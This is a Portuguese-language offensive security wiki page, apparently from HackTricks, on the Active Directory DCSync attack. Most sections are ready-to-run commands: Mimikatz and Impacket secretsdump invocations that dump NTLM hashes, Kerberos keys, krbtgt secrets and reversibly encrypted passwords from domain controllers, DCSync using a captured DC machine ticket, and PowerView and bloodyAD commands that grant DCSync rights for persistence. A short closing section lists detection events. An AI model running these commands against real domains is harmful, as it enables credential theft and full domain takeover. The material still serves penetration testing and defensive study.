# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

A permissão **DCSync** implica possuir estas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Notas importantes sobre DCSync:**

- O **ataque DCSync simula o comportamento de um Domain Controller e solicita que outros Domain Controllers repliquem informações** usando o Directory Replication Service Remote Protocol (MS-DRSR). Como o MS-DRSR é uma função válida e necessária do Active Directory, ele não pode ser desativado ou desabilitado.
- Por padrão, somente os grupos **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** possuem os privilégios necessários.
- Na prática, o **DCSync completo** requer **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** no contexto de nomenclatura do domínio. `DS-Replication-Get-Changes-In-Filtered-Set` é comumente delegado junto com eles, mas, isoladamente, é mais relevante para sincronizar **atributos confidenciais / filtrados por RODC** (por exemplo, secrets no estilo do LAPS legado) do que para um dump completo do krbtgt.<sup>[[2]](#references)</sup>
- Se alguma senha de conta estiver armazenada com criptografia reversível, uma opção estará disponível no Mimikatz para retornar a senha em texto claro

### Enumeração

Verifique quem possui essas permissões usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Se quiser focar em **principals não padrão** com direitos de DCSync, filtre os grupos internos com capacidade de replicação e analise apenas os trustees inesperados:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explorar remotamente
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Exemplos práticos com escopo definido:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync usando um TGT de máquina do DC capturado (ccache)

Em cenários de unconstrained-delegation no modo de exportação, você pode capturar um TGT de máquina de um Domain Controller (por exemplo, `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Em seguida, você pode usar esse ccache para autenticar-se como o DC e realizar DCSync sem uma senha.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas operacionais:

- **O caminho Kerberos do Impacket acessa o SMB primeiro** antes da chamada DRSUAPI. Se o ambiente aplicar **validação do nome de destino do SPN**, um dump completo poderá falhar com `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Nesse caso, solicite primeiro um tíquete de serviço **`cifs/<dc>`** para o DC de destino ou use **`-just-dc-user`** como alternativa para a conta de que você precisa imediatamente.
- Quando você possui apenas permissões de replicação inferiores, a sincronização no estilo LDAP/DirSync ainda pode expor atributos **confidenciais** ou **filtrados pelo RODC** (por exemplo, o `ms-Mcs-AdmPwd` legado) sem uma replicação completa do krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` gera 3 arquivos:

- um com os **hashes NTLM**
- um com as **chaves Kerberos**
- um com senhas em texto claro do NTDS para quaisquer contas configuradas com [**criptografia reversível**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Você pode obter usuários com criptografia reversível usando

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistência

Se você for um administrador de domínio, poderá conceder essas permissões a qualquer usuário com a ajuda do PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Operadores Linux podem fazer o mesmo com `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Em seguida, você pode **verificar se o usuário recebeu corretamente** os 3 privilégios procurando por eles na saída de (você deverá conseguir ver os nomes dos privilégios dentro do campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (A política de auditoria para o objeto deve estar habilitada) – Uma operação foi realizada em um objeto<sup>[[4]](#references)</sup>
- Security Event ID 5136 (A política de auditoria para o objeto deve estar habilitada) – Um objeto do serviço de diretório foi modificado
- Security Event ID 4670 (A política de auditoria para o objeto deve estar habilitada) – As permissões em um objeto foram alteradas
- AD ACL Scanner - Crie e compare relatórios de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Aproveitando Replication Get-Changes e Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Despejando hashes de senha do Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — credenciais do SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
